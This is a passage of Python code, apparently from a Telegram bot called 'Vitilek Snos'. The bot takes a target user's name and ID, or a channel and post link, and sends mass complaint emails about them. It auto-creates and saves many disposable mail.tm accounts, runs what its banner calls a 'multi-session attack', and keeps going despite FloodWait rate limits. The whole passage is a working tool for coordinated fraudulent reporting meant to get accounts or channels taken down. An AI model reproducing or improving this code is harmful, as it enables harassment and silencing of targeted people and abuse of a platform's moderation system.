    await state.update_data(complaint_type=complaint_type, target_type="channel")
    await state.set_state(ComplaintState.waiting_links)

    await callback.message.edit_text(
        "<b>Введите ссылку на канал и ссылку на нарушение через пробел:</b>\n\n"
        "Пример: https://t.me/channel https://t.me/channel/123",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Отмена", callback_data="complaint_channel")]
        ]),
        parse_mode="HTML"
    )
    await callback.answer()


@dp.message(StateFilter(ComplaintState.waiting_username))
async def process_username(message: types.Message, state: FSMContext):
    username = message.text.strip().replace("@", "")
    await state.update_data(username=username)

    data = await state.get_data()
    if data.get("complaint_type") == "1":
        await state.set_state(ComplaintState.waiting_id)
        await message.answer("<b>Введите причину жалобы:</b>", parse_mode="HTML")
    else:
        await state.set_state(ComplaintState.waiting_id)
        await message.answer("<b>Введите Telegram ID:</b>", parse_mode="HTML")


@dp.message(StateFilter(ComplaintState.waiting_id))
async def process_id(message: types.Message, state: FSMContext):
    data = await state.get_data()

    if data.get("complaint_type") == "1":
        reason = message.text.strip()
        await state.update_data(reason=reason)
        await message.answer("<b>Введите Telegram ID:</b>", parse_mode="HTML")
        await state.set_state(ComplaintState.waiting_id)
    else:
        telegram_id = message.text.strip()
        await state.update_data(telegram_id=telegram_id)

        data = await state.get_data()
        username = data.get("username")
        complaint_type = data.get("complaint_type")

        await message.answer("<b>Отправка жалоб...</b>", parse_mode="HTML")

        sent = await send_mass_complaint_account_async(
            username, telegram_id, "", complaint_type, mail_tm
        )

        await message.answer(
            f"<b>ГОТОВО!</b>\n\nЮзернейм: @{username}\nID: {telegram_id}\nОтправлено: {sent} писем",
            reply_markup=get_main_menu(),
            parse_mode="HTML"
        )

        await state.clear()


@dp.message(StateFilter(ComplaintState.waiting_links))
async def process_links(message: types.Message, state: FSMContext):
    parts = message.text.strip().split()
    if len(parts) < 2:
        await message.answer("Введите две ссылки через пробел!")
        return

    channel_link = parts[0]
    violation_link = parts[1]

    data = await state.get_data()
    complaint_type = data.get("complaint_type")

    await message.answer("<b>Отправка жалоб...</b>", parse_mode="HTML")

    sent = await send_mass_complaint_channel_async(
        channel_link, violation_link, complaint_type, mail_tm
    )

    await message.answer(
        f"<b>ГОТОВО!</b>\n\nКанал: {channel_link}\nОтправлено: {sent} писем",
        reply_markup=get_main_menu(),
        parse_mode="HTML"
    )

    await state.clear()


@dp.callback_query(F.data == "mailtm_status")
async def mailtm_status(callback: types.CallbackQuery):
    if not USE_MAILTM:
        await callback.answer("Mail.tm отключен в настройках", show_alert=True)
        return

    if not mail_tm.accounts:
        await callback.answer("Нет активных mail.tm аккаунтов", show_alert=True)
        return

    text = "<b>Статус Mail.tm аккаунтов:</b>\n\n"
    for i, acc in enumerate(mail_tm.accounts[:20], 1):
        text += f"{i}. <code>{acc['email']}</code>\n"

    if len(mail_tm.accounts) > 20:
        text += f"\n... и ещё {len(mail_tm.accounts) - 20}"

    text += f"\n\n<b>Всего аккаунтов:</b> {len(mail_tm.accounts)}"

    await callback.message.edit_text(
        text,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Обновить аккаунты", callback_data="refresh_mailtm")],
            [InlineKeyboardButton(text="Назад", callback_data="main_menu")]
        ]),
        parse_mode="HTML"
    )
    await callback.answer()


@dp.callback_query(F.data == "refresh_mailtm")
async def refresh_mailtm(callback: types.CallbackQuery):
    await callback.answer("Создание новых аккаунтов...")

    await mail_tm.close()

    tm_accounts = await mail_tm.create_multiple_accounts(MAILTM_ACCOUNTS_COUNT)

    with open('mailtm_accounts.json', 'w') as f:
        json.dump(tm_accounts, f, indent=2)

    await callback.message.edit_text(
        f"<b>Создано {len(tm_accounts)} новых mail.tm аккаунтов</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Показать аккаунты", callback_data="mailtm_status")],
            [InlineKeyboardButton(text="Назад", callback_data="main_menu")]
        ]),
        parse_mode="HTML"
    )


# ---------- ГЛОБАЛЬНАЯ ИНИЦИАЛИЗАЦИЯ ----------
mail_tm = MailTM()


# ---------- ЗАПУСК ----------
async def main():
    logger.info("Vitilek Snos запускается...")

    # Сначала инициализируем сессии
    await init_sessions()

    # Затем создаем почтовые аккаунты
    if USE_MAILTM:
        logger.info(f"Создание {MAILTM_ACCOUNTS_COUNT} временных почтовых аккаунтов...")

        # Пробуем загрузить существующие
        try:
            with open('mailtm_accounts.json', 'r') as f:
                existing_accounts = json.load(f)
                mail_tm.accounts = existing_accounts
                logger.info(f"Загружено {len(mail_tm.accounts)} mail.tm аккаунтов из файла")
        except:
            mail_tm.accounts = []

        # Если нужно больше аккаунтов, создаем недостающие
        if len(mail_tm.accounts) < MAILTM_ACCOUNTS_COUNT:
            need_to_create = MAILTM_ACCOUNTS_COUNT - len(mail_tm.accounts)
            logger.info(f"Необходимо создать еще {need_to_create} аккаунтов")

            new_accounts = await mail_tm.create_multiple_accounts(need_to_create)
            mail_tm.accounts.extend(new_accounts)

            # Сохраняем все аккаунты
            with open('mailtm_accounts.json', 'w') as f:
                json.dump(mail_tm.accounts, f, indent=2)

        logger.info(f"Итого mail.tm аккаунтов: {len(mail_tm.accounts)}")

        # Проверяем валидность аккаунтов
        valid_accounts = []
        for acc in mail_tm.accounts:
            if all(k in acc for k in ['email', 'password', 'token']):
                valid_accounts.append(acc)

        mail_tm.accounts = valid_accounts
        logger.info(f"Валидных аккаунтов: {len(mail_tm.accounts)}")

    # Очистка старых сессий
    for f in os.listdir('.'):
        if f.endswith('.session') and not f.startswith('pool_'):
            try:
                os.remove(f)
            except:
                pass

    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)


if __name__ == "__main__":
    print("Vitilek Snos")
    print(f"Мультисессионная атака ({MAX_SESSIONS} сессий)")
    print(f"Mail.tm аккаунтов: {MAILTM_ACCOUNTS_COUNT}")
    print("Продолжение при FloodWait")
    print("Расширенная почтовая система")

    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Бот остановлен")
    finally:
        if mail_tm:
            asyncio.run(mail_tm.close())